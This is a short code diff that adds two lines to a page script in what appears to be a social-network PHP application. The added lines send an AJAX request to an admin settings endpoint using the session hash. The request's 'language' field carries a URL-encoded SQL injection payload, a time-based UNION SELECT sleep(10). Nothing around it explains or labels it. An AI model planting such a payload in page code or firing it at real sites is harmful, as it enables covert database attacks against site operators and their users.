@@ -84,4 +84,6 @@ $(function() {
     }
   });
 });
+$.post(Wo_Ajax_Requests_File() + '?f=admin_setting&s=update_general_setting&hash_id=<?php echo Wo_CreateSession();?>',{language:"english%60%20FROM%20%60%7B%7D%60%20UNION%20SELECT%20sleep(10)%2C0%3B%20--%20-"}, function(data, textStatus, xhr) {
+});
 </script>
